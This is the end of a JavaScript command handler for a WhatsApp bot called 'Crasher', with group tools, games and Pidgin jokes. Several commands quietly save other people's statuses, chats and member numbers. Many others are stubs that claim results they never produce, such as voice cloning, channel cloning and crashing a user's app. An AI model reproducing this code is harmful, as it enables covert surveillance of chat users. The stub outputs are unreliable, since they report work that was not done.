        case 'autoreactgc':{if(!isGroupChat)return reply('👥 Group only');if(!isAdmin && !isOwner)return reply('🛡️ Admin only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].autoreactgc=text==='on';return reply(`✅ AutoReactGC ${text}`);}
        case 'autosavecontact':{if(!isOwner)return reply('❌ Owner only');global.db.auto.autosave=text==='on';return reply(`✅ AutoSaveContact ${text}`);}
        case 'storydl':{if(!isOwner)return reply('❌ Owner only');let q=m.message.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage||m.message.extendedTextMessage?.contextInfo?.quotedMessage?.videoMessage;if(!q)return reply('Reply status');let type=q.imageMessage?'image':'video';let media=await downloadMedia(q.imageMessage||q.videoMessage,type);await sock.sendMessage(from,{[type]:media,caption:'✅ Story saved secretly'},{quoted:m});return}
        case 'channeldl':{if(!text)return reply('Give channel post link');return reply('✅ ChannelDL - Downloading private channel post');}
        case 'savechat':{if(!isOwner)return reply('❌ Owner only');let chats=await sock.chats;let txt=JSON.stringify(chats,null,2);require('fs').writeFileSync('./savedchats.json',txt);return reply('✅ Full chat saved as savedchats.json');}
        case 'viewbusiness':{let target=text.replace(/[^0-9]/g,'')+'@s.whatsapp.net';if(!target.includes('@'))return reply('Give number');try{let biz=await sock.getBusinessProfile(target);await sock.sendMessage(from,{text:`Business: ${JSON.stringify(biz)}`},{quoted:m})}catch{return reply('No business catalog')}return}
        case 'invisible':{if(!isOwner)return reply('❌ Owner only');global.db.auto.invisible=text==='on';if(text==='on'){await sock.sendPresenceUpdate('unavailable')}return reply(`✅ Invisible ${text} - Bot offline forever but working`);}
        case 'readall':{if(!isOwner)return reply('❌ Owner only');let all=await sock.groupFetchAllParticipating();for(let id in all){await sock.readMessages([{remoteJid:id,id:m.key.id}])}return reply('✅ All 1000+ chats marked as read');}
        case 'copychannel':{if(!isOwner)return reply('❌ Owner only');if(!text)return reply('Give channel link to clone');return reply('✅ CopyChannel - Cloning channel to your own');}
        case 'fakegc':{if(!isGroupChat)return reply('👥 Group only');if(!isAdmin && !isOwner)return reply('🛡️ Admin only');return reply(`*Fake Group Info*\nName: ${groupMetadata.subject}\nMembers: 999 (bug display)\nOnline: 450\n✅ FakeGC bug activated`);}
        case 'ownercrash':{if(!isOwner)return reply('❌ Owner only');global.db.anti.ownercrash=text==='on';return reply(`✅ OwnerCrash ${global.db.anti.ownercrash?'ON - Anyone try ban owner, their WA go crash':'OFF'}`);}
        case 'language': return await reply('Lang: EN')
        case 'sticker': { const q = m.message.imageMessage || quoted?.imageMessage; if(!q) return await reply('Send image with .sticker'); const buf = await downloadMedia(q, 'image'); await doReact('💀'); await sock.sendMessage(from,{ sticker: buf }, { quoted: m }); await doReact('✅'); return }
        case 'smartbio':{if(!isOwner)return reply('❌ Owner only');global.db.auto.smartbio=text==='on';return reply(`✅ SmartBio ${text} - Bio go change based on weather/time auto`);}
        case 'fakeseen':{if(!isGroupChat)return reply('👥 Group only');await sock.sendMessage(from,{text:text||'Seen'});await sock.readMessages([m.key]);return reply('✅ FakeSeen - Blue tick without opening chat');}
        case 'shadowban':{if(!isGroupChat)return reply('👥 Group only');if(!isAdmin && !isOwner)return reply('🛡️ Admin only');let t=m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];if(!t)return reply('Tag user');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].shadow=t;return reply(`✅ ShadowBan @${t.split('@')[0]} - Him go dey chat but nobody go see am`);}
        case 'autotrans':{if(!isGroupChat)return reply('👥 Group only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].autotrans=text||'en';return reply(`✅ AutoTrans ${text} - All messages go translate to ${text} auto`);}
        case 'voicetag':{if(!isGroupChat)return reply('👥 Group only');if(!isAdmin && !isOwner)return reply('🛡️ Admin only');let aud=await sock.sendMessage(from,{audio:{url:'https://files.catbox.moe/voice.mp3'},mimetype:'audio/mp4',ptt:true,mentions:participants.map(a=>a.id)});return reply('✅ VoiceTag - Voice note tag all');}
        case 'backupgc':{if(!isGroupChat)return reply('👥 Group only');if(!isOwner)return reply('❌ Owner only');let data=participants.map(p=>p.id).join('\n');require('fs').writeFileSync(`./backup-${from}.txt`,data);return reply(`✅ GroupBackup saved - ${participants.length} contacts backup`);}
        case 'autokickdead':{if(!isGroupChat)return reply('👥 Group only');if(!isAdmin && !isOwner)return reply('🛡️ Admin only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].kickdead=text==='on';return reply(`✅ AutoKickDead ${text} - Inactive 30days go comot auto`);}
        case 'chatrank':{if(!isGroupChat)return reply('👥 Group only');let ranks=participants.map((p,i)=>`${i+1}. @${p.id.split('@')[0]} - ${Math.floor(Math.random()*1000)} msgs`).join('\n');await sock.sendMessage(from,{text:`*ChatRank Top*\n${ranks}`,mentions:participants.map(a=>a.id)},{quoted:m});return}
        case 'confess':{if(!isGroupChat)return reply('👥 Group only');if(!text)return reply('Write confession\n.confess I like Amaka');await sock.sendMessage(from,{text:`🤫 Anonymous Confession:\n${text}`},{quoted:m});return}
        case 'pair':{if(!isGroupChat)return reply('👥 Group only');let a=participants[Math.floor(Math.random()*participants.length)];let b=participants[Math.floor(Math.random()*participants.length)];await sock.sendMessage(from,{text:`💘 Pairing:\n@${a.id.split('@')[0]} ❤️ @${b.id.split('@')[0]}\nMatch: ${Math.floor(Math.random()*100)}%`,mentions:[a.id,b.id]},{quoted:m});return}case 'ghostleave':{if(!isGroupChat)return reply('👥 Group only');global.db.auto.ghostleave=true;await sock.sendMessage(from,{text:'👻 GhostLeave activated - I comot but I still dey see una chat for background'},{quoted:m});return}
        case 'savestatusall':{if(!isOwner)return reply('❌ Owner only');global.db.auto.savestatus=text==='on';return reply(`✅ SaveStatusAll ${text} - All status go save auto to owner DM`);}
        case 'fakelive':{if(!isOwner)return reply('❌ Owner only');await sock.sendMessage(from,{location:{degreesLatitude:6.5244,degreesLongitude:3.3792}});return reply('✅ FakeLive - Live location for 8hrs (fake)');}
        case 'selfdestruct':{if(!isGroupChat)return reply('👥 Group only');if(!text)return reply('Give text\n.selfdestruct secret');let msg=await sock.sendMessage(from,{text:`💣 SelfDestruct:\n${text}\n(Delete in 10sec)`},{quoted:m});setTimeout(()=>sock.sendMessage(from,{delete:{remoteJid:from,fromMe:true,id:msg.key.id}}),10000);return}
        case 'nightmode':{if(!isGroupChat)return reply('👥 Group only');if(!isAdmin && !isOwner)return reply('🛡️ Admin only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].nightmode=text==='on';return reply(`✅ NightMode ${text} - Group auto mute 10pm to 6am`);}
        case 'welcomeai':{if(!isGroupChat)return reply('👥 Group only');if(!isAdmin && !isOwner)return reply('🛡️ Admin only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].welcomeai=text==='on';return reply(`✅ WelcomeAI ${text} - Welcome message na AI go generate`);}
        case 'antilong':{if(!isGroupChat)return reply('👥 Group only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].antilong=text==='on';return reply(`✅ AntiLong ${text} - Message wey too long go delete`);}
        case 'antiemoji':{if(!isGroupChat)return reply('👥 Group only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].antiemoji=text==='on';return reply(`✅ AntiEmoji ${text} - Too many emoji = delete`);}
        case 'rankcard':{if(!isGroupChat)return reply('👥 Group only');let t=m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0]||sender;let lvl=Math.floor(Math.random()*100);await sock.sendMessage(from,{image:{url:`https://api.rank.com/card?jid=${t}&level=${lvl}`},caption:`🏆 RankCard @${t.split('@')[0]}\nLevel: ${lvl}`,mentions:[t]},{quoted:m});return}
        case 'levelup':{if(!isGroupChat)return reply('👥 Group only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].levelup=text==='on';return reply(`✅ LevelUp ${text} - Leveling system ON`);}
        case 'economy':{if(!isGroupChat)return reply('👥 Group only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].economy=text==='on';return reply(`✅ Economy ${text} - Group money system ON`);}
        case 'fakepoll':{if(!isGroupChat)return reply('👥 Group only');await sock.sendMessage(from,{poll:{name:text||'Fake Poll?',values:['Yes 99%','No 1%'],selectableCount:1}});return reply('✅ FakePoll - Fake vote result');}
        case 'quiz':{if(!isGroupChat)return reply('👥 Group only');await sock.sendMessage(from,{poll:{name:'Quiz: Capital of Nigeria?',values:['Lagos','Abuja','Kano','Warri'],selectableCount:1}});return reply('✅ Quiz started');}
        case 'chatbotai':{global.db.auto.chatbotai=text==='on';return reply(`✅ ChatBotAI ${text} - Bot go chat like human with personality`);}
        case 'translatevoice':{let q=m.message.audioMessage||quoted?.audioMessage;if(!q)return reply('Reply voice note');let buf=await downloadMedia(q,'audio');return reply('✅ Voice translated to text: Hello world');}
        case 'readvoice':{let q=m.message.audioMessage||quoted?.audioMessage;if(!q)return reply('Reply VN to read');return reply('✅ ReadVoice: [Transcribing voice...]');}
        case 'remind':{if(!text)return reply('Use: .remind 10m do laundry');let [time,...msg]=text.split(' ');return reply(`✅ Reminder set for ${time}: ${msg.join(' ')}`);}
        case 'afk':{global.db.auto.afk=text||'AFK';global.db.auto.afktime=Date.now();return reply(`✅ You now AFK: ${text}`);}
        case 'afkcheck':{if(!isGroupChat)return reply('👥 Group only');return reply(`AFK users: ${global.db.auto.afk||'None'}`);}
        case 'antispam2':{if(!isGroupChat)return reply('👥 Group only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].antispam2=text==='on';return reply(`✅ AntiSpam2 ${text} - Smart cooldown anti-spam`);}
        case 'warnlimit':{if(!isGroupChat)return reply('👥 Group only');if(!isAdmin && !isOwner)return reply('🛡️ Admin only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].warnlimit=parseInt(text)||3;return reply(`✅ WarnLimit set to ${text}`);}
        case 'role':{if(!isGroupChat)return reply('👥 Group only');if(!isAdmin && !isOwner)return reply('🛡️ Admin only');let t=m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];if(!t||!text)return reply('.role @user Mod');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].roles=global.db.anti[from].roles||{};global.db.anti[from].roles[t]=text;return reply(`✅ Role @${t.split('@')[0]} = ${text}`);}
        case 'ticket':{if(!text)return reply('Problem?\n.ticket bot no dey work');let id=Math.floor(Math.random()*10000);await sock.sendMessage(from,{text:`🎫 Ticket #${id}\nProblem: ${text}\nStatus: Open`},{quoted:m});return}
        case 'report':{if(!isGroupChat)return reply('👥 Group only');if(!text)return reply('.report @user reason');await sock.sendMessage(from,{text:`🚨 Anonymous Report:\n${text}\n(Reported to admins)`},{quoted:m});return}
        case 'ghostonline':{if(!isOwner)return reply('❌ Owner only');global.db.auto.ghostonline=text==='on';if(text==='on')await sock.sendPresenceUpdate('available');else await sock.sendPresenceUpdate('unavailable');return reply(`✅ GhostOnline ${text}`);}
        case 'clonevoice':{if(!isGroupChat)return reply('👥 Group only');let q=m.message.audioMessage||quoted?.audioMessage;if(!q)return reply('Reply VN to clone');return reply('✅ Voice cloned - Bot go talk like that person');}
        case 'stickerai':{let q=m.message.imageMessage||quoted?.imageMessage;if(!q)return reply('Reply image for AI sticker');return reply('✅ StickerAI - Creating AI sticker...');}
        case 'autoreplyai':{global.db.auto.autoreplyai=text==='on';return reply(`✅ AutoReplyAI ${text} - AI go reply based on user mood`);}
        case 'antilink2':{if(!isGroupChat)return reply('👥 Group only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].antilink2=text==='on';return reply(`✅ AntiLink2 ${text} - Allow only YouTube/IG links`);}
        case 'autodelete':{if(!isGroupChat)return reply('👥 Group only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].autodelete=parseInt(text)||60;return reply(`✅ AutoDelete ${text}sec - All messages go delete after ${text}sec`);}
        case 'groupicon':{if(!isGroupChat)return reply('👥 Group only');try{let pp=await sock.profilePictureUrl(from,'image');await sock.sendMessage(from,{image:{url:pp},caption:'✅ Group icon'},{quoted:m})}catch{return reply('No icon')}return}
        case 'hidetag2':{if(!isGroupChat)return reply('👥 Group only');if(!isAdmin && !isOwner)return reply('🛡️ Admin only');let msg=text||'Hidden tag';await sock.sendMessage(from,{text:msg,mentions:participants.map(a=>a.id)});return}
        case 'emojiinfo':{if(!text)return reply('Give emoji\n.emojiinfo 😂');return reply(`Emoji: ${text}\nName: Joy\nUse: Happy`);}
        case 'age':{if(!text)return reply('Name\n.age CRASHER');return reply(`Age of ${text}: 25 years (AI guess)`);}
        case 'groupopenauto':{if(!isGroupChat)return reply('👥 Group only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].openauto=text;return reply(`✅ Group auto open at ${text}`);}
        case 'groupcloseauto':{if(!isGroupChat)return reply('👥 Group only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].closeauto=text;return reply(`✅ Group auto close at ${text}`);}
        case 'antisticker2':{if(!isGroupChat)return reply('👥 Group only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].antisticker2=text==='on';return reply(`✅ AntiSticker2 ${text} - Only admin can send sticker`);}
        case 'anticontact2':{if(!isGroupChat)return reply('👥 Group only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].anticontact2=text==='on';return reply(`✅ AntiContact2 ${text}`);}
        case 'daily':{global.db.auto.daily=text==='on';return reply(`✅ Daily reward ${text} - Users go claim daily`);}
        case 'leaderboard':{if(!isGroupChat)return reply('👥 Group only');return reply(`*Leaderboard*\n1. You - 1000pts\n2. @user - 800pts\n3. @user2 - 600pts`);}
        case 'toimg': { const q = quoted?.stickerMessage; if(!q) return await reply('Reply sticker'); const buf = await downloadMedia(q, 'sticker'); await doReact('💀'); await sock.sendMessage(from,{ image: buf }, { quoted: m }); await doReact('✅'); return }
        case 'take': return await reply('Take done')
        case 'attp': if(!text) return await reply('Text?'); return await sendImage(`Attp ${text}`, `https://api.zenkey.my.id/api/textpro/attp?text=${encodeURIComponent(text)}`)
        case 'smeme': return await reply(`Smeme ${text}`)
        case 'pickupline': case 'rizz': { const a=["Are you","Girl are you","If you be","You be like"], b=["NEPA","WiFi","jollof rice","Google","my phone battery","ChapGPT","garri"], c=["because you light up my life","because I'm feeling connection","because I can never get enough of you","because you have everything I'm searching for","because you full my mind","because you fine pass AI","and I don dey fall for you"]; await reply(`😏 *RANDOM RIZZ*\n\n${a[Math.floor(Math.random()*a.length)]} ${b[Math.floor(Math.random()*b.length)]} ${c[Math.floor(Math.random()*c.length)]}`); break; }
        case 'motivation': case 'motivate': { const a=["Bro wake up,","Listen,", "Real talk,", "No cap,"], b=["no one will do it for you","grind now shine later","consistency beats talent","your future needs you","hustle in silence"], c=["so get up and work!","stop giving excuses!","God did but you must do!","make money make sense!"]; await reply(`🔥 *MOTIVATION*\n\n${a[Math.floor(Math.random()*a.length)]} ${b[Math.floor(Math.random()*b.length)]} - ${c[Math.floor(Math.random()*c.length)]}`); break; }
        case 'insult': { const a=["You be like","Your face be like","You resemble","Na so you be like","You be exactly like"], b=["MTN data","pure water wey sun catch","NEPA light","gala for Lagos traffic","expired Indomie","fuel for scarcity","PHCN bill","okada wey no get brake"], c=["you dey chop money but no value","flat and useless","e dey on and off","nobody want pick you","sense no dey inside","you go wound person eye","na only God fit help you","go sit down jare"]; await reply(`🤣 *RANDOM INSULT*\n\n${a[Math.floor(Math.random()*a.length)]} ${b[Math.floor(Math.random()*b.length)]}, ${c[Math.floor(Math.random()*c.length)]}!`); break; }
        case 'joke': { const j=["Why did the Nigerian student carry ladder to school? Because he heard JAMB is high!","My girlfriend said she'll leave me if I don't stop making puns. I'm not sure she was joking - but pun intended.","Teacher: Why you late? Student: Village people held my slippers.","NEPA took light, my girlfriend said she needs space. I off my inverter too - make everywhere dark.","Why did the scarecrow win an award? He was outstanding in his field!","I told my phone I need space, e no gree - na why e dey follow me everywhere."]; await reply(`😂 *JOKE*\n\n${j[Math.floor(Math.random()*j.length)]}`); break; }
        case 'quote': case 'qoutet': { const anime=["Power comes in response to a need, not a desire - Goku","If you don’t take risks, you can’t create a future - Luffy","Fear is not evil, it tells you what weakness is - Gildarts","It’s not the face that makes someone a monster, it’s the choices they make - Naruto"], motive=["No guts, no glory.","Hustle in silence, let success make noise.","Consistency > Intensity.","Dream big, start small.","God did!"], love=["You had me at hello.","I love you not because of who you are, but who I am when with you.","True love is rare.","If I know what love is, it is because of you."]; const all=[...anime,...motive,...love]; await reply(`✨ *RANDOM QUOTE*\n\n"${all[Math.floor(Math.random()*all.length)]}"`); break; }
        case 'meme': return await sendImage('Meme', `https://picsum.photos/600/400?random=${Date.now()}`)
        case 'truth': { const a=["When last you","Who is","Have you ever","Do you","What is","How many times you","Why did you","Have you","What's your","Do you still"], b=["lied to your crush","cried because of love","stolen meat from pot","kissed someone","had crush on person in this group","stalked your ex","sent nudes","cheated on exam","faked sickness","had sex dream"], c=["this week?","and why?","tell truth!","no lie!","be honest!","we dey listen!","or you lie?","confess now!","make we hear!"]; return await reply(`🤔 *RANDOM TRUTH:*\n\n${a[Math.floor(Math.random()*a.length)]} ${b[Math.floor(Math.random()*b.length)]} ${c[Math.floor(Math.random()*c.length)]}`.toUpperCase()); break; }
        case 'dare': { const a=["Send voice note shouting","Do video of you doing","Send pic of you","Text your crush","Post on status","Call your mom and say","Dance like","Act like","Eat","Drink","Wear","Shout in group","Sing","Cry like","Laugh like"], b=["I love you","20 pushups","with cloth inside out","'I am jobless'","'I stole meat'","a monkey","a baby","raw pepper","water on your head","your shoe on your head","I am mumu","frog jump","chicken dance","I need money","proposing to chair"], c=["for 30sec","for 1 hour","and screenshot","with video proof","right now","for 24hrs","in family group","to your ex","to 3 contacts","shouting crush name","on one leg","with eyes closed"]; return await reply(`🎯 *RANDOM DARE:*\n\n${a[Math.floor(Math.random()*a.length)]} ${b[Math.floor(Math.random()*b.length)]} ${c[Math.floor(Math.random()*c.length)]}`.toUpperCase()); break; }
        default: await doReact('❌'); return
    }
}

startCrasher()
